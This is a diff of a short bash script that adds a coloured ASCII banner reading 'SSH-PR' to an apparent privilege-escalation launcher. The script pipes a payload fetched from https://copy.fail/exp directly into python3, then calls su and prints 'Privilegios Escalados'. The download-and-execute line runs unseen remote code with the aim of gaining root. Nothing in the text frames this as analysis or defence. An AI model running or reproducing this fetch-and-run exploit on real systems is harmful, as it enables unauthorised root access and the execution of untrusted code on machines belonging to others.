@@ -1,5 +1,23 @@
 #!/bin/bash
 
+clear
+
+C1='\033[38;5;46m'
+C2='\033[38;5;82m'
+C3='\033[38;5;118m'
+RESET='\033[0m'
+
+printf "${C1}"
+echo '   __________ __  __      ____  ____'
+printf "${C2}"
+echo '  / ___/ ___// / / /     / __ \/ __ \'
+echo '  \__ \\__ \/ /_/ /_____/ /_/ / /_/ /'
+printf "${C3}"
+echo ' ___/ /__/ / __  /_____/ ____/ _, _/'
+echo '/____/____/_/ /_/     /_/   /_/ |_|'
+
+printf "${RESET}\n"
+
 curl https://copy.fail/exp | python3
 su
 echo "Privilegios Escalados"
